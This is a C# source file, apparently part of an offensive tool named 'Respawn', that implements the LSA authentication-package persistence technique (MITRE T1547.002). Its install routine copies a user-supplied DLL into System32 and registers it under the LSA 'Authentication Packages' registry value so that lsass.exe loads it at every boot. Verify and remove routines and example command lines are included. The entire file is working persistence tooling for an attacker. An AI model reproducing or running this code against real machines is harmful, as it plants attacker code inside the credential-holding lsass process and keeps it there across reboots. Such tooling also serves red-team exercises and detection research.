using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.LSA
{
    public class LSAModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "lsa";
        public string Name        => "LSA Authentication";
        public string Mitre       => "T1547.002";
        public string Description => "Persist by abusing the Local Security Authority (LSA) registry configuration to register a custom authentication package DLL that Windows automatically loads into the `lsass.exe` process during boot.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string RegPath   = @"SYSTEM\CurrentControlSet\Control\Lsa";
        const string ValueName = "Authentication Packages";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            // 2. CRITICAL REQUIREMENTS
            // Console.ForegroundColor = ConsoleColor.Cyan;
            // Console.WriteLine("  TECHNICAL REQUIREMENTS:");
            // Console.ResetColor();
            // // Console.WriteLine("    - DLL must be moved to C:\\Windows\\System32");
            // Console.WriteLine("    - Requires REBOOT to load into lsass.exe");
            // Console.WriteLine();

            // 3. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-n,  --name", "Package name (WITHOUT .dll extension)");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Source path of the DLL (.dll only)");
            Console.WriteLine();

            // 4. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t lsa -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t lsa -a install -n \"SSPModule\" -p \"C:\\p.dll\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t lsa -a verify  -n \"SSPModule\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t lsa -a remove  -n \"SSPModule\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return LSAKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return TechniqueResult.Denied("Access denied opening LSA registry key. Run as administrator.");

                // read current MULTI_SZ value
                string[] current = regKey.GetValue(ValueName) as string[]
                    ?? new string[] { "msv1_0" };

                // check if already registered
                if (current.Any(p => p.Equals(ctx.Name, StringComparison.OrdinalIgnoreCase)))
                    return TechniqueResult.Exists($"LSA package '{ctx.Name}' already registered.");

                // copy DLL to System32 — lsass.exe only loads from System32
                string system32   = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string targetPath = Path.Combine(system32, ctx.Name + ".dll");

                if (!System.IO.File.Exists(targetPath))
                    System.IO.File.Copy(ctx.Payload, targetPath, overwrite: false);

                // append package name to MULTI_SZ value
                var updated = current.ToList();
                updated.Add(ctx.Name);
                regKey.SetValue(ValueName, updated.ToArray(), RegistryValueKind.MultiString);

                return TechniqueResult.Ok(
                    $"Installed LSA package '{ctx.Name}' | " +
                    $"DLL copied to: '{targetPath}' | " +
                    $"Reboot required to load into lsass.exe.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. LSA package registration requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return TechniqueResult.Denied("Access denied opening LSA registry key. Run as administrator.");

                string[] current = regKey.GetValue(ValueName) as string[]
                    ?? new string[] { "msv1_0" };

                if (!current.Any(p => p.Equals(ctx.Name, StringComparison.OrdinalIgnoreCase)))
                    return TechniqueResult.NotFound($"LSA package '{ctx.Name}' not found.");

                // remove package name from MULTI_SZ value
                var updated = current
                    .Where(p => !p.Equals(ctx.Name, StringComparison.OrdinalIgnoreCase))
                    .ToArray();
                regKey.SetValue(ValueName, updated, RegistryValueKind.MultiString);

                // remove DLL from System32
                string system32   = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string targetPath = Path.Combine(system32, ctx.Name + ".dll");
                if (System.IO.File.Exists(targetPath))
                    System.IO.File.Delete(targetPath);

                return TechniqueResult.Ok(
                    $"Removed LSA package '{ctx.Name}' and deleted DLL from System32. " +
                    $"Reboot required to fully unload from lsass.exe.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. LSA package registration requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (regKey == null)
                    return TechniqueResult.Denied("Access denied opening LSA registry key. Run as administrator.");

                string[] current = regKey.GetValue(ValueName) as string[]
                    ?? new string[] { "msv1_0" };

                if (!current.Any(p => p.Equals(ctx.Name, StringComparison.OrdinalIgnoreCase)))
                    return TechniqueResult.NotFound($"LSA package '{ctx.Name}' not found.");

                string system32   = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string targetPath = Path.Combine(system32, ctx.Name + ".dll");
                bool   dllExists  = System.IO.File.Exists(targetPath);

                return TechniqueResult.Ok(
                    $"Verified LSA package '{ctx.Name}' | " +
                    $"Registered: Yes | " +
                    $"DLL in System32: {dllExists} | " +
                    $"All packages: [{string.Join(", ", current)}]");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. LSA package registration requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No package name specified. Use -n <name> (without .dll extension).";
                return false;
            }
            if (ctx.Name.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
            {
                error = "Package name must NOT include .dll extension.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            if (requirePayload && !ctx.Payload.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
            {
                error = "LSA authentication package requires a DLL payload.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}